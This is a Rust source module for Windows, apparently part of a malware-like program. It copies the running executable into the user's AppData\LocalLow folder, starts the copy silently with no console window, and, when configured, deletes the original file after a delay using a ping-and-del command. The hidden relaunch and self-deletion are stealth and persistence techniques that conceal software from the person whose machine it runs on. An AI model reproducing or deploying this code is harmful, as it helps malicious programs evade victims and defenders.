use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::config::Config;
use crate::core::exit_patcher::safe_exit;
use crate::log_debug;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn get_install_path() -> PathBuf {
    if let Ok(userprofile) = env::var("USERPROFILE") {
        PathBuf::from(userprofile).join("AppData").join("LocalLow")
    } else {
        PathBuf::from(r"C:\Users\Public\AppData\LocalLow")// backup
    }
}

pub fn check_if_installed(current_exe: &Path) -> bool {
    let exe_name = Config::get_exe_name();
    let current_exe_name = current_exe.file_name().and_then(|n| n.to_str()).unwrap_or("");

    if current_exe_name == exe_name {
        if let Some(parent) = current_exe.parent() {
            if parent == get_install_path() {
                return true;
            }
        }
    }

    false
}

pub fn install_to_path() -> anyhow::Result<()> {
    let current_exe = env::current_exe()?;
    let exe_name = Config::get_exe_name();
    let install_dir = get_install_path();

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    let target_path = install_dir.join(exe_name);
    
    fs::copy(&current_exe, &target_path)?;

    log_debug!("Installed to: {}", target_path.display());

    log_debug!("Starting installed exe...");

    Command::new("cmd")
        .args(["/c", "start", "", &target_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?;

    log_debug!("Installed exe started, exiting original process...");

    // Autodelete original exe if enabled
    let autodelete_config = Config::get_autodelete_config();
    if autodelete_config.enabled {
        let current_exe_path = current_exe.to_string_lossy().to_string();
        let delay_ms = autodelete_config.delay_ms;
        
        // Use cmd to delete the original exe after a delay
        let delete_cmd = format!(
            "ping 127.0.0.1 -n {} > nul & del /f /q \"{}\"",
            (delay_ms / 1000).max(1) + 1,
            current_exe_path
        );
        
        Command::new("cmd")
            .args(["/c", &delete_cmd])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;
        
        log_debug!("Autodelete scheduled for original exe");
    }

    std::thread::sleep(std::time::Duration::from_millis(500));
    safe_exit(0);
}
